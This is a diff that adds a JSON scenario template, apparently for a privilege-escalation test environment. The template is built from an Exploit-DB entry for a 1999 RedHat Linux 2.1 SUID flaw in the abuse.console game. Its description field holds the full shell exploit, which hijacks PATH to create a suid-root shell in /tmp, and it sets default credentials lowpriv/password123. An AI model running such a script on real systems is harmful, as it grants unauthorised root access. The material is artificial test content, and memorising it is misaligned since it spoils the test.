@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19279",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: RedHat Linux 2.1 - 'abuse.console' Local Privilege Escalation (CVE-1999-1491;OSVDB-13539)\n\nExploit source code (19279.sh):\n```\nsource: https://www.securityfocus.com/bid/354/info\n\nAbuse is a game that is included with RedHat Linux 2.1 in the games package. The console version, abuse.console, is suid-root and will load the program sndrv as root without checking for an absolute pathname. This means that sndrv can be substituted in another directory by a regular user and used to locally execute arbitrary code on the target machine. Consequences are a root compromise.\n\nExploit:\n\n#!/bin/sh\n\n#\n\n# abuser.sh\n\n# exploits a security hole in abuse to create\n\n# a suid root shell /tmp/abuser on a linux\n\n# Red Hat 2.1 system with the games package\n\n# installed.\n\n#\n\n# by Dave M. (davem@cmu.edu)\n\n#\n\necho ================ abuser.sh - gain root on Linux Red Hat 2.1 system\n\necho ================ Checking system vulnerability\n\nif test -u /usr/lib/games/abuse/abuse.console\n\nthen\n\necho ++++++++++++++++ System appears vulnerable.\n\ncd /tmp\n\ncat << _EOF_ > /tmp/undrv\n\n#!/bin/sh\n\n/bin/cp /bin/sh /tmp/abuser\n\n/bin/chmod 4777 /tmp/abuser\n\n_EOF_\n\nchmod +x /tmp/undrv\n\nPATH=/tmp\n\necho ================ Executing Abuse\n\n/usr/lib/games/abuse/abuse.console\n\n/bin/rm /tmp/undrv\n\nif test -u /tmp/abuser\n\nthen\n\necho ++++++++++++++++ Exploit successful, suid shell located in /tmp/abuser\n\nelse\n\necho ---------------- Exploit failed\n\nfi\n\nelse\n\necho ---------------- This machine does not appear to be vulnerable.\n\nfi\n```",
+  "cve": "CVE-1999-1491;OSVDB-13539",
+  "exploitdb_id": "19279",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19279",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
